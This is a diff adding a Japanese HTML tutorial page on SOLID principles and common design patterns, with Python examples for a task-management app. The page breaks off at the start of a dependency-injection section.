@@ -1,0 +1,2601 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="フェーズ7：エンジニアリングの技術 — デザインパターン、SQLマスタリー、トランザクション、ネットワーク、並行処理、セキュリティエンジニアリング。第28〜33章。">
+<title>フェーズ7：エンジニアリングの技術 — ゼロからヒーロー</title>
+<link href="https://fonts.googleapis.com/css2?family=Instrument+Serif:ital@0;1&amp;family=DM+Sans:ital,opsz,wght@0,9..40,300;0,9..40,400;0,9..40,500;0,9..40,600;0,9..40,700;1,9..40,400&amp;family=JetBrains+Mono:wght@400;500&family=Noto+Sans+JP:wght@300;400;500;600;700&amp;display=swap" rel="stylesheet">
+<link rel="stylesheet" href="../css/design-system.css">
+<script>try{if(localStorage.getItem('zth-theme')==='light')document.documentElement.setAttribute('data-theme','light')}catch(e){}</script>
+<script>try{var z=localStorage.getItem('zth-zoom');if(z&&+z>=50&&+z<=200)document.documentElement.style.zoom=+z/100}catch(e){}</script>
+</head>
+<body>
+
+<svg xmlns="http://www.w3.org/2000/svg" style="position:absolute;width:0;height:0"><defs>
+<marker id="arrowhead" markerWidth="8" markerHeight="6" refX="7" refY="3" orient="auto"><path d="M0,0 L8,3 L0,6" fill="var(--accent)"/></marker>
+<marker id="arrowhead-muted" markerWidth="8" markerHeight="6" refX="7" refY="3" orient="auto"><path d="M0,0 L8,3 L0,6" fill="var(--a5)"/></marker>
+</defs></svg>
+
+<button class="hamburger" id="hamburger"><span></span><span></span><span></span></button>
+<div class="sidebar-overlay" id="sidebar-overlay"></div>
+<button class="toggle" id="themeToggle" aria-label="Toggle theme">
+<svg class="is" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="var(--accent)" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg>
+<svg class="im" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="var(--accent)" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"/></svg>
+</button>
+
+<aside class="sidebar" id="sidebar">
+<aside class="sidebar" id="sidebar">
+  <a href="index.html" class="sidebar-logo"><span>ゼロからヒーロー</span>プログラミング &rarr; マルチエージェントAI</a>
+  <div class="toc-group">
+    <div class="toc-group-title">基礎</div>
+    <a href="phase-1.html#ch01" class="toc-link"><span class="toc-num">01</span>プログラミングとは何か</a>
+    <a href="phase-1.html#ch02" class="toc-link"><span class="toc-num">02</span>コンピュータがコードを実行する仕組み</a>
+    <a href="phase-1.html#ch03" class="toc-link"><span class="toc-num">03</span>環境のセットアップ</a>
+    <a href="phase-1.html#ch04" class="toc-link"><span class="toc-num">04</span>書く前にコードを読む</a>
+  </div>
+  <div class="toc-group">
+    <div class="toc-group-title">Python</div>
+    <a href="phase-2.html#ch05" class="toc-link"><span class="toc-num">05</span>関数、ロジック、制御フロー</a>
+    <a href="phase-2.html#ch06" class="toc-link"><span class="toc-num">06</span>データ構造</a>
+    <a href="phase-2.html#ch07" class="toc-link"><span class="toc-num">07</span>クラスとオブジェクト指向プログラミング</a>
+    <a href="phase-2.html#ch08" class="toc-link"><span class="toc-num">08</span>ファイル、モジュール、標準ライブラリ</a>
+    <a href="phase-2.html#ch09" class="toc-link"><span class="toc-num">09</span>エラー処理、デバッグ、テスト</a>
+  </div>
+  <div class="toc-group">
+    <div class="toc-group-title">開発ツール</div>
+    <a href="phase-3.html#ch10" class="toc-link"><span class="toc-num">10</span>ターミナルとシェル</a>
+    <a href="phase-3.html#ch11" class="toc-link"><span class="toc-num">11</span>Gitの基礎</a>
+    <a href="phase-3.html#ch12" class="toc-link"><span class="toc-num">12</span>GitリモートとGitHub</a>
+  </div>
+  <div class="toc-group">
+    <div class="toc-group-title">構築とデプロイ</div>
+    <a href="phase-4.html#ch13" class="toc-link"><span class="toc-num">13</span>APIとHTTP</a>
+    <a href="phase-4.html#ch14" class="toc-link"><span class="toc-num">14</span>FlaskでAPIを構築する</a>
+    <a href="phase-4.html#ch15" class="toc-link"><span class="toc-num">15</span>データベースの基礎</a>
+    <a href="phase-4.html#ch16" class="toc-link"><span class="toc-num">16</span>Dockerとコンテナ</a>
+    <a href="phase-4.html#ch17" class="toc-link"><span class="toc-num">17</span>CI/CDとGitHub Actions</a>
+    <a href="phase-4.html#ch18" class="toc-link"><span class="toc-num">18</span>プロジェクトアーキテクチャ</a>
+  </div>
+  <div class="toc-group">
+    <div class="toc-group-title">データ構造</div>
+    <a href="phase-5.html#ch19" class="toc-link"><span class="toc-num">19</span>計算量分析</a>
+    <a href="phase-5.html#ch20" class="toc-link"><span class="toc-num">20</span>線形構造</a>
+    <a href="phase-5.html#ch21" class="toc-link"><span class="toc-num">21</span>ハッシュテーブルとマップ</a>
+    <a href="phase-5.html#ch22" class="toc-link"><span class="toc-num">22</span>木構造</a>
+    <a href="phase-5.html#ch23" class="toc-link"><span class="toc-num">23</span>グラフ</a>
+  </div>
+  <div class="toc-group">
+    <div class="toc-group-title">アルゴリズム</div>
+    <a href="phase-6.html#ch24" class="toc-link"><span class="toc-num">24</span>探索とソート</a>
+    <a href="phase-6.html#ch25" class="toc-link"><span class="toc-num">25</span>再帰と動的計画法</a>
+    <a href="phase-6.html#ch26" class="toc-link"><span class="toc-num">26</span>アルゴリズムパターン</a>
+    <a href="phase-6.html#ch27" class="toc-link"><span class="toc-num">27</span>グラフアルゴリズム</a>
+  </div>
+  <div class="toc-group">
+    <div class="toc-group-title">エンジニアリングの技術</div>
+    <a href="phase-7.html#ch28" class="toc-link"><span class="toc-num">28</span>デザインパターンとSOLID</a>
+    <a href="phase-7.html#ch29" class="toc-link"><span class="toc-num">29</span>SQLとクエリマスタリー</a>
+    <a href="phase-7.html#ch30" class="toc-link"><span class="toc-num">30</span>トランザクションとNoSQL</a>
+    <a href="phase-7.html#ch31" class="toc-link"><span class="toc-num">31</span>ネットワークとインターネット</a>
+    <a href="phase-7.html#ch32" class="toc-link"><span class="toc-num">32</span>並行性と並列処理</a>
+    <a href="phase-7.html#ch33" class="toc-link"><span class="toc-num">33</span>セキュリティエンジニアリング</a>
+  </div>
+  <div class="toc-group">
+    <div class="toc-group-title">システムとスケール</div>
+    <a href="phase-8.html#ch34" class="toc-link"><span class="toc-num">34</span>システム設計</a>
+    <a href="phase-8.html#ch35" class="toc-link"><span class="toc-num">35</span>分散システム</a>
+    <a href="phase-8.html#ch36" class="toc-link"><span class="toc-num">36</span>パフォーマンスと可観測性</a>
+    <a href="phase-8.html#ch37" class="toc-link"><span class="toc-num">37</span>大規模コードベースのナビゲーション</a>
+  </div>
+  <div class="toc-group">
+    <div class="toc-group-title">AIレベル1〜5</div>
+    <a href="phase-9.html#ch38" class="toc-link"><span class="toc-num">38</span>AIコードの評価と指示</a>
+    <a href="phase-9.html#ch39" class="toc-link"><span class="toc-num">39</span>レベル1&amp;2 — タブ補完とエージェントIDE</a>
+    <a href="phase-9.html#ch40" class="toc-link"><span class="toc-num">40</span>レベル3 — コンテキストエンジニアリング</a>
+    <a href="phase-9.html#ch41" class="toc-link"><span class="toc-num">41</span>レベル4 — 複合エンジニアリング</a>
+    <a href="phase-9.html#ch42" class="toc-link"><span class="toc-num">42</span>レベル5 — MCP、スキル、機能</a>
+  </div>
+  <div class="toc-group">
+    <div class="toc-group-title">AIレベル6〜8</div>
+    <a href="phase-10.html#ch43" class="toc-link"><span class="toc-num">43</span>レベル6 — ハーネスエンジニアリング</a>
+    <a href="phase-10.html#ch44" class="toc-link"><span class="toc-num">44</span>レベル7 — バックグラウンドエージェント</a>
+    <a href="phase-10.html#ch45" class="toc-link"><span class="toc-num">45</span>DockerでのClaude Code</a>
+    <a href="phase-10.html#ch46" class="toc-link"><span class="toc-num">46</span>レベル8 — 自律エージェントチーム</a>
+    <a href="phase-10.html#ch47" class="toc-link"><span class="toc-num">47</span>マルチプレイヤー効果</a>
+  </div>
+  <div class="toc-group">
+    <div class="toc-group-title">リファレンス</div>
+    <a href="appendices.html#glossary" class="toc-link"><span class="toc-num">&oplus;</span>用語集</a>
+    <a href="appendices.html#prompt-library" class="toc-link"><span class="toc-num">&oplus;</span>プロンプトライブラリ</a>
+    <a href="appendices.html#self-assessment" class="toc-link"><span class="toc-num">&oplus;</span>自己評価</a>
+    <a href="appendices.html#common-mistakes" class="toc-link"><span class="toc-num">&oplus;</span>よくある間違い</a>
+    <a href="appendices.html#appendix-d" class="toc-link"><span class="toc-num">&oplus;</span>トラブルシューティング</a>
+    <a href="appendices.html#appendix-e" class="toc-link"><span class="toc-num">&oplus;</span>リソース</a>
+  </div>
+</aside>
+</aside>
+
+<div class="main">
+<section class="hero hero-sm">
+  <div class="hero-badge">フェーズ7 &mdash; エンジニアリングの技術</div>
+  <h1>エンジニアリングの<em>技術</em></h1>
+  <p class="hero-sub">デザインパターン、データベースマスタリー、ネットワーク、並行処理、セキュリティ。コードが書ける人とシステムが構築できる人を隔てるスキルです。</p>
+  <div class="hero-meta"><span>第28〜33章</span><span>フェーズゲート + TaskForge</span></div>
+</section>
+<div class="content-wrap">
+
+<div role="note" class="callout info">
+<div class="callout-title">補足</div>
+<p>このフェーズでは以下のことができることを前提としています：アルゴリズム（algorithm）の計算量（complexity）を分析する（第19章）、データ構造（data structure）を実装する（第20〜23章）、アルゴリズムパターンを適用する（第24〜27章）、FlaskとSQLiteでAPIを構築する（第14〜15章）。不安な部分がある場合は、先に関連する章を復習してください。</p>
+</div>
+
+
+<!-- ===== CH 28 ===== -->
+<section id="ch28" data-ch="28">
+<h2><span class="ch-label">第28章</span> デザインパターン（Design Patterns）とクリーンアーキテクチャ</h2>
+
+<div role="note" class="callout info">
+<div class="callout-title">重要な概念</div>
+<p>動作するコードを書くことはできます。しかし、要件が変わっても<em>動き続ける</em>コードが書けるでしょうか？デザインパターン（design pattern）とSOLID原則は、数十年にわたるソフトウェアエンジニアリングの集合知であり、繰り返し現れる問題に対する実証済みの解決策です。これらはコードベースが優雅に成長するか、それとも自重で崩壊するかの分かれ目となります。この章では最も重要なパターンを認識し、いつ適用するか、そして同様に重要な点として<em>適用しないべきとき</em>を理解できるようになります。</p>
+</div>
+
+<h3>SOLID原則</h3>
+
+<p><strong>SOLID</strong>は、オブジェクト指向設計を導く5つの原則の頭文字をとったものです。Robert C. Martinによってまとめられ命名され、保守しやすいソフトウェアの基盤を成します。Pythonコードでの実際の違反例と修正例を見ながら、一つひとつ解説していきます。</p>
+
+<h4>S &mdash; 単一責任の原則（Single Responsibility Principle / SRP）</h4>
+
+<p>クラスは<em>変更する理由が一つだけ</em>であるべきです。ビジネスロジックとファイルI/Oの両方を扱うクラスには、更新が必要になる理由が二つあることになります。</p>
+
+<p><strong>違反例：</strong></p>
+<pre style="overflow-x:auto"><code>class TaskManager:
+    """Handles tasks AND writes reports AND sends emails."""
+    def __init__(self):
+        self.tasks = []
+
+    def add_task(self, title, priority):
+        self.tasks.append({"title": title, "priority": priority})
+
+    def generate_report(self):
+        html = "&lt;h1&gt;Task Report&lt;/h1&gt;"
+        for t in self.tasks:
+            html += f"&lt;p&gt;{t['title']} - {t['priority']}&lt;/p&gt;"
+        return html
+
+    def send_email(self, to_address, body):
+        import smtplib
+        server = smtplib.SMTP("mail.example.com")
+        server.sendmail("tasks@example.com", to_address, body)
+        server.quit()</code></pre>
+
+<p>このクラスには変更する理由が三つあります：タスクロジック、レポートのフォーマット、メール配信です。SMTPからメールAPIに切り替える場合、タスク管理を担うのと同じファイルを編集することになります。</p>
+
+<p><strong>修正 &mdash; 責任ごとにクラスを分割する：</strong></p>
+<pre style="overflow-x:auto"><code>class TaskManager:
+    """Only manages tasks."""
+    def __init__(self):
+        self.tasks = []
+
+    def add_task(self, title, priority):
+        self.tasks.append({"title": title, "priority": priority})
+
+    def get_tasks(self):
+        return list(self.tasks)
+
+
+class TaskReporter:
+    """Only generates reports from task data."""
+    def generate_html(self, tasks):
+        html = "&lt;h1&gt;Task Report&lt;/h1&gt;"
+        for t in tasks:
+            html += f"&lt;p&gt;{t['title']} - {t['priority']}&lt;/p&gt;"
+        return html
+
+
+class EmailSender:
+    """Only sends emails."""
+    def send(self, to_address, body):
+        import smtplib
+        server = smtplib.SMTP("mail.example.com")
+        server.sendmail("tasks@example.com", to_address, body)
+        server.quit()</code></pre>
+
+<p>これで各クラスが変更する理由をちょうど一つ持つようになりました。タスクロジックに触れずにメール送信機能を入れ替えることができます。</p>
+
+<h4>O &mdash; 開放/閉鎖の原則（Open/Closed Principle / OCP）</h4>
+
+<p>ソフトウェアの構成要素は<em>拡張に対して開放的で、修正に対して閉鎖的</em>であるべきです。既存のコードを書き直すことなく、新しい振る舞いを追加できる必要があります。</p>
+
+<p><strong>違反例：</strong></p>
+<pre style="overflow-x:auto"><code>class TaskExporter:
+    def export(self, tasks, format_type):
+        if format_type == "json":
+            import json
+            return json.dumps(tasks)
+        elif format_type == "csv":
+            lines = ["title,priority"]
+            for t in tasks:
+                lines.append(f"{t['title']},{t['priority']}")
+            return "\n".join(lines)
+        # Every new format requires editing THIS method</code></pre>
+
+<p>XMLエクスポートを追加するには既存の<code>export</code>メソッドを修正する必要があり、OCPに違反します。</p>
+
+<p><strong>修正 &mdash; ポリモーフィズム（多態性）を使う：</strong></p>
+<pre style="overflow-x:auto"><code>from abc import ABC, abstractmethod
+
+class Exporter(ABC):
+    @abstractmethod
+    def export(self, tasks): pass
+
+class JsonExporter(Exporter):
+    def export(self, tasks):
+        import json
+        return json.dumps(tasks)
+
+class CsvExporter(Exporter):
+    def export(self, tasks):
+        lines = ["title,priority"]
+        for t in tasks:
+            lines.append(f"{t['title']},{t['priority']}")
+        return "\n".join(lines)
+
+# Adding XML? Create a new class. Zero existing code changes.
+class XmlExporter(Exporter):
+    def export(self, tasks):
+        xml = "&lt;tasks&gt;"
+        for t in tasks:
+            xml += f"&lt;task&gt;&lt;title&gt;{t['title']}&lt;/title&gt;&lt;/task&gt;"
+        xml += "&lt;/tasks&gt;"
+        return xml</code></pre>
+
+<h4>L &mdash; リスコフの置換原則（Liskov Substitution Principle / LSP）</h4>
+
+<p>サブタイプは、正確さを損なうことなく、その親型が期待される任意の場所で使用できなければなりません。関数が<code>Bird</code>を受け付ける場合、<code>Penguin.fly()</code>が例外を投げてクラッシュすることなく<code>Penguin</code>を渡せる必要があります。</p>
+
+<p><strong>違反例：</strong></p>
+<pre style="overflow-x:auto"><code>class Rectangle:
+    def __init__(self, width, height):
+        self.width = width
+        self.height = height
+
+    def area(self):
+        return self.width * self.height
+
+class Square(Rectangle):
+    def __init__(self, side):
+        super().__init__(side, side)
+
+    def set_width(self, w):
+        self.width = w
+        self.height = w  # Silently changes height too!</code></pre>
+
+<p><code>rect.set_width(5)</code>を呼び出してから<code>rect.height</code>が変わっていないことを確認するコードは、Squareでは壊れます。修正方法：SquareをRectangleから継承させない。代わりに共通の<code>Shape</code>インターフェースを使います。</p>
+
+<h4>I &mdash; インターフェース分離の原則（Interface Segregation Principle / ISP）</h4>
+
+<p>クライアントは使用しないメソッドへの依存を強制されるべきではありません。20のメソッドを持つ「太い」インターフェースは、実装者全員に未使用メソッドのスタブを書かせることになります。</p>
+
+<p><strong>違反例：</strong></p>
+<pre style="overflow-x:auto"><code>class Worker(ABC):
+    @abstractmethod
+    def code(self): pass
+
+    @abstractmethod
+    def test(self): pass
+
+    @abstractmethod
+    def manage_team(self): pass  # Not all workers manage!
+
+class JuniorDev(Worker):
+    def code(self): return "Writing code"
+    def test(self): return "Running tests"
+    def manage_team(self):
+        raise NotImplementedError("Juniors don't manage!")</code></pre>
+
+<p><strong>修正 &mdash; 役割ごとにインターフェースを分割する：</strong></p>
+<pre style="overflow-x:auto"><code>class Coder(ABC):
+    @abstractmethod
+    def code(self): pass
+
+class Tester(ABC):
+    @abstractmethod
+    def test(self): pass
+
+class Manager(ABC):
+    @abstractmethod
+    def manage_team(self): pass
+
+class JuniorDev(Coder, Tester):
+    def code(self): return "Writing code"
+    def test(self): return "Running tests"
+
+class TechLead(Coder, Tester, Manager):
+    def code(self): return "Writing code"
+    def test(self): return "Running tests"
+    def manage_team(self): return "Leading the team"</code></pre>
+
+<h4>D &mdash; 依存性逆転の原則（Dependency Inversion Principle / DIP）</h4>
+
+<p>上位モジュールは下位モジュールに依存してはいけません。両方とも<strong>抽象（abstractions）</strong>に依存するべきです。</p>
+
+<p><strong>違反例：</strong></p>
+<pre style="overflow-x:auto"><code>class TaskService:
+    def __init__(self):
+        self.db = SQLiteDatabase("tasks.db")  # Hard-wired!
+
+    def get_all_tasks(self):
+        return self.db.query("SELECT * FROM tasks")</code></pre>
+
+<p>実際のファイルなしではデータベースの差し替えもテストもできません。<strong>修正 &mdash; 抽象に依存する：</strong></p>
+<pre style="overflow-x:auto"><code>class Database(ABC):
+    @abstractmethod
+    def query(self, sql): pass
+
+class TaskService:
+    def __init__(self, db: Database):
+        self.db = db  # Injected from outside
+
+    def get_all_tasks(self):
+        return self.db.query("SELECT * FROM tasks")
+
+# Production:
+service = TaskService(SQLiteDatabase("tasks.db"))
+# Testing:
+test_service = TaskService(InMemoryDatabase())</code></pre>
+
+<h3>生成パターン（Creational Patterns）</h3>
+
+<p>生成パターンはオブジェクトの生成方法を抽象化し、呼び出し側のコードがインスタンス化されるクラスを知る必要をなくします。</p>
+
+<h4>ファクトリーパターン（Factory Pattern）</h4>
+
+<p><strong>ファクトリー</strong>は生成ロジックを公開せずにオブジェクトを作成します。コンストラクタを直接呼び出す代わりに、入力に基づいて適切なオブジェクトを返すファクトリー関数を呼び出します。</p>
+
+<pre style="overflow-x:auto"><code>class Task:
+    def __init__(self, title, priority="medium"):
+        self.title = title
+        self.priority = priority
+
+class Bug(Task):
+    def __init__(self, title, severity="normal"):
+        super().__init__(title, priority="high")
+        self.severity = severity
+
+class Feature(Task):
+    def __init__(self, title, story_points=1):
+        super().__init__(title, priority="medium")
+        self.story_points = story_points
+
+def create_task(task_type, title, **kwargs):
+    """Factory function: caller doesn't know which class is used."""
+    factories = {
+        "bug": Bug,
+        "feature": Feature,
+        "task": Task,
+    }
+    cls = factories.get(task_type)
+    if cls is None:
+        raise ValueError(f"Unknown task type: {task_type}")
+    return cls(title, **kwargs)
+
+# Usage &mdash; caller never imports Bug or Feature directly
+item = create_task("bug", "Login page crashes", severity="critical")
+print(type(item).__name__)  # Bug</code></pre>
+
+<h4>ビルダーパターン（Builder Pattern）</h4>
+
+<p>構築に多くのオプションパラメータが必要な場合、<strong>ビルダー</strong>パターンは15個の引数を持つコンストラクタの代わりに、読みやすいステップバイステップのインターフェースを提供します。</p>
+
+<pre style="overflow-x:auto"><code>class TaskBuilder:
+    def __init__(self, title):
+        self._title = title
+        self._priority = "medium"
+        self._assignee = None
+        self._labels = []
+        self._due_date = None
+
+    def priority(self, p):
+        self._priority = p
+        return self  # Enable chaining
+
+    def assign_to(self, name):
+        self._assignee = name
+        return self
+
+    def label(self, lbl):
+        self._labels.append(lbl)
+        return self
+
+    def due(self, date):
+        self._due_date = date
+        return self
+
+    def build(self):
+        return {
+            "title": self._title,
+            "priority": self._priority,
+            "assignee": self._assignee,
+            "labels": self._labels,
+            "due_date": self._due_date,
+        }
+
+# Clean, readable construction
+task = (TaskBuilder("Fix login bug")
+        .priority("high")
+        .assign_to("Alice")
+        .label("security")
+        .label("urgent")
+        .due("2026-04-01")
+        .build())</code></pre>
+
+<h4>シングルトン（Singleton）— そして、なぜ通常は間違いか</h4>
+
+<p><strong>シングルトン</strong>はクラスのインスタンスがグローバルに一つだけ存在することを保証します。</p>
+
+<pre style="overflow-x:auto"><code>class ConfigManager:
+    _instance = None
+
+    def __new__(cls):
+        if cls._instance is None:
+            cls._instance = super().__new__(cls)
+            cls._instance.settings = {}
+        return cls._instance
+
+a = ConfigManager()
+b = ConfigManager()
+assert a is b  # True &mdash; same object</code></pre>
+
+<div role="note" class="callout warn">
+<div class="callout-title">注意</div>
+<p>「シングルトンは状態共有の良い方法」というのは誤解です。シングルトンは変装したグローバル状態です。すべてのテストが同じミュータブルなインスタンスを共有するため、テストが非常に難しくなります。また、関数シグネチャに現れないままどのコードからでもアクセスできる隠れた依存関係を作り出します。依存性注入（dependency injection）を使うことをお勧めします。最上位で一つのインスタンスを作成し、必要なすべてに渡してください。</p>
+</div>
+
+<h3>構造パターン（Structural Patterns）</h3>
+
+<h4>アダプターパターン（Adapter Pattern）</h4>
+
+<p><strong>アダプター</strong>は互換性のないインターフェースをコードが期待するものに合わせるためにラップします。TaskForgeが<code>save()</code>と<code>load()</code>を期待しているが、サードパーティのライブラリが<code>write_data()</code>と<code>read_data()</code>を使っている場合を想像してください。</p>
+
+<pre style="overflow-x:auto"><code>class ThirdPartyStorage:
+    """We cannot modify this class."""
+    def write_data(self, key, value):
+        print(f"Writing {key}: {value}")
+
+    def read_data(self, key):
+        return {"title": "Example task"}
+
+class StorageAdapter:
+    """Makes ThirdPartyStorage look like our interface."""
+    def __init__(self, adaptee):
+        self._adaptee = adaptee
+
+    def save(self, key, value):
+        return self._adaptee.write_data(key, value)
+
+    def load(self, key):
+        return self._adaptee.read_data(key)
+
+# TaskForge code works without changes
+storage = StorageAdapter(ThirdPartyStorage())
+storage.save("task-1", {"title": "Buy groceries"})</code></pre>
+
+<h4>デコレーターパターン（Decorator Pattern）</h4>
+
+<p><strong>デコレーター</strong>パターンはクラスを修正せずにオブジェクトに振る舞いを追加します。Pythonは関数デコレーターをネイティブにサポートしていますが、OOP版は同じインターフェースを持つ別のオブジェクトの内部に一つのオブジェクトをラップします。</p>
+
+<pre style="overflow-x:auto"><code>class TaskService:
+    def get_task(self, task_id):
+        return {"id": task_id, "title": "Fix bug"}
+
+class LoggingTaskService:
+    """Adds logging around every call."""
+    def __init__(self, wrapped):
+        self._wrapped = wrapped
+
+    def get_task(self, task_id):
+        print(f"[LOG] Getting task {task_id}")
+        result = self._wrapped.get_task(task_id)
+        print(f"[LOG] Found: {result['title']}")
+        return result
+
+class CachingTaskService:
+    """Adds caching."""
+    def __init__(self, wrapped):
+        self._wrapped = wrapped
+        self._cache = {}
+
+    def get_task(self, task_id):
+        if task_id not in self._cache:
+            self._cache[task_id] = self._wrapped.get_task(task_id)
+        return self._cache[task_id]
+
+# Stack decorators: logging around caching around real service
+service = LoggingTaskService(CachingTaskService(TaskService()))</code></pre>
+
+<h4>ファサードパターン（Facade Pattern）</h4>
+
+<p><strong>ファサード</strong>は複雑なサブシステムへの簡略化されたインターフェースを提供します。呼び出し側が10個のクラスと対話させる代わりに、いくつかの明確なメソッドを持つ一つのクラスを提供します。</p>
+
+<pre style="overflow-x:auto"><code>class TaskForge:
+    """Facade: one entry point for the entire system."""
+    def __init__(self, db, auth, notifier, logger):
+        self._db = db
+        self._auth = auth
+        self._notifier = notifier
+        self._logger = logger
+
+    def create_task(self, user_token, title, priority):
+        user = self._auth.verify(user_token)
+        task = self._db.insert_task(title, priority, user.id)
+        self._notifier.notify_team(f"New task: {title}")
+        self._logger.log("task_created", task.id, user.id)
+        return task</code></pre>
+
+<h3>振る舞いパターン（Behavioural Patterns）</h3>
+
+<h4>オブザーバーパターン（Observer Pattern / Pub/Sub）</h4>
+
+<p><strong>オブザーバー</strong>パターンはオブジェクトがイベントを購読できるようにします。何かが起きると、すべての購読者が自動的に通知され、イベントソースとハンドラーが疎結合になります。</p>
+
+<pre style="overflow-x:auto"><code>class EventBus:
+    def __init__(self):
+        self._listeners = {}
+
+    def subscribe(self, event_type, callback):
+        self._listeners.setdefault(event_type, []).append(callback)
+
+    def publish(self, event_type, data):
+        for callback in self._listeners.get(event_type, []):
+            callback(data)
+
+bus = EventBus()
+
+def send_email(task):
+    print(f"Email: New task '{task['title']}' created")
+
+def update_dashboard(task):
+    print(f"Dashboard: Refreshing with new task")
+
+bus.subscribe("task_created", send_email)
+bus.subscribe("task_created", update_dashboard)
+
+# When a task is created, both handlers fire automatically
+bus.publish("task_created", {"title": "Fix login bug", "priority": "high"})</code></pre>
+
+<h4>ストラテジーパターン（Strategy Pattern）</h4>
+
+<p><strong>ストラテジー</strong>パターンは交換可能なアルゴリズムのファミリーを定義します。クライアントは実行時に使用するアルゴリズムを選びます。これがTaskForgeのストレージバックエンドに使用するパターンです。</p>
+
+<!-- Strategy Pattern SVG Diagram -->
+<svg viewBox="0 0 700 340" aria-label="Strategy pattern diagram showing TaskManager using a StorageBackend interface with three implementations: SQLiteBackend, JsonFileBackend, and InMemoryBackend" style="width:100%;max-width:700px;margin:1.5rem auto;display:block">
+  <!-- TaskManager box -->
+  <rect x="250" y="10" width="200" height="60" rx="8" class="node-fill" stroke="var(--accent)" stroke-width="2"/>
+  <text x="350" y="35" class="label-text" text-anchor="middle" font-size="15" font-weight="600">TaskManager</text>
+  <text x="350" y="55" class="sub-text" text-anchor="middle" font-size="11">uses storage.save() / .load()</text>
+
+  <!-- Arrow down to interface -->
+  <line x1="350" y1="70" x2="350" y2="118" class="arrow" stroke="var(--accent)" stroke-width="2" marker-end="url(#arrowhead)"/>
+  <text x="370" y="100" class="sub-text" font-size="10">depends on</text>
+
+  <!-- StorageBackend interface -->
+  <rect x="220" y="120" width="260" height="60" rx="8" class="node-accent" stroke="var(--accent)" stroke-width="2" stroke-dasharray="6,3"/>
+  <text x="350" y="145" class="label-text" text-anchor="middle" font-size="13" font-style="italic">&laquo;interface&raquo;</text>
+  <text x="350" y="165" class="label-text" text-anchor="middle" font-size="14" font-weight="600">StorageBackend</text>
+
+  <!-- Three implementations -->
+  <rect x="20" y="260" width="180" height="60" rx="8" class="node-fill" stroke="var(--accent)" stroke-width="2"/>
+  <text x="110" y="285" class="label-text" text-anchor="middle" font-size="13" font-weight="600">SQLiteBackend</text>
+  <text x="110" y="305" class="sub-text" text-anchor="middle" font-size="10">tasks.db file</text>
+
+  <rect x="260" y="260" width="180" height="60" rx="8" class="node-fill" stroke="var(--accent)" stroke-width="2"/>
+  <text x="350" y="285" class="label-text" text-anchor="middle" font-size="13" font-weight="600">JsonFileBackend</text>
+  <text x="350" y="305" class="sub-text" text-anchor="middle" font-size="10">tasks.json file</text>
+
+  <rect x="500" y="260" width="180" height="60" rx="8" class="node-fill" stroke="var(--accent)" stroke-width="2"/>
+  <text x="590" y="285" class="label-text" text-anchor="middle" font-size="13" font-weight="600">InMemoryBackend</text>
+  <text x="590" y="305" class="sub-text" text-anchor="middle" font-size="10">dict in RAM (testing)</text>
+
+  <!-- Dashed arrows from implementations up to interface -->
+  <line x1="110" y1="260" x2="295" y2="180" class="arrow" stroke="var(--a5)" stroke-width="1.5" stroke-dasharray="5,3" marker-end="url(#arrowhead-muted)"/>
+  <line x1="350" y1="260" x2="350" y2="180" class="arrow" stroke="var(--a5)" stroke-width="1.5" stroke-dasharray="5,3" marker-end="url(#arrowhead-muted)"/>
+  <line x1="590" y1="260" x2="405" y2="180" class="arrow" stroke="var(--a5)" stroke-width="1.5" stroke-dasharray="5,3" marker-end="url(#arrowhead-muted)"/>
+
+  <text x="80" y="230" class="sub-text" font-size="10">implements</text>
+  <text x="350" y="230" class="sub-text" text-anchor="middle" font-size="10">implements</text>
+  <text x="560" y="230" class="sub-text" font-size="10">implements</text>
+</svg>
+
+<pre style="overflow-x:auto"><code>from abc import ABC, abstractmethod
+
+class StorageBackend(ABC):
+    @abstractmethod
+    def save(self, task_id, task_data):
+        """Persist a task."""
+        pass
+
+    @abstractmethod
+    def load(self, task_id):
+        """Retrieve a task by ID, or None."""
+        pass
+
+    @abstractmethod
+    def list_all(self):
+        """Return all stored tasks."""
+        pass
+
+class InMemoryBackend(StorageBackend):
+    def __init__(self):
+        self._store = {}
+
+    def save(self, task_id, task_data):
+        self._store[task_id] = task_data
+
+    def load(self, task_id):
+        return self._store.get(task_id)
+
+    def list_all(self):
+        return list(self._store.values())
+
+class TaskManager:
+    def __init__(self, backend: StorageBackend):
+        self._backend = backend
+
+    def add_task(self, task_id, title, priority="medium"):
+        self._backend.save(task_id, {"title": title, "priority": priority})
+
+    def get_task(self, task_id):
+        return self._backend.load(task_id)</code></pre>
+
+<p>素晴らしい点は、<code>TaskManager</code>がどのバックエンドを使っているかを知らなくてよいことです。ビジネスロジックを一切変更せずに、インメモリからSQLite、クラウドデータベースへと切り替えることができます。</p>
+
+<h4>コマンドパターン（Command Pattern）</h4>
+
+<p><strong>コマンド</strong>パターンはリクエストをオブジェクトとしてカプセル化し、操作のアンドゥ/リドゥ、キューイング、ログ記録を可能にします。</p>
+
+<pre style="overflow-x:auto"><code>class Command(ABC):
+    @abstractmethod
+    def execute(self): pass
+
+    @abstractmethod
+    def undo(self): pass
+
+class AddTaskCommand(Command):
+    def __init__(self, manager, task_id, title):
+        self.manager = manager
+        self.task_id = task_id
+        self.title = title
+
+    def execute(self):
+        self.manager.add_task(self.task_id, self.title)
+
+    def undo(self):
+        self.manager.remove_task(self.task_id)
+
+class CommandHistory:
+    def __init__(self):
+        self._history = []
+
+    def execute(self, command):
+        command.execute()
+        self._history.append(command)
+
+    def undo_last(self):
+        if self._history:
+            cmd = self._history.pop()
+            cmd.undo()</code></pre>
+
+<h3>依存性注入（Dependency Injection）の実践</h3>
+
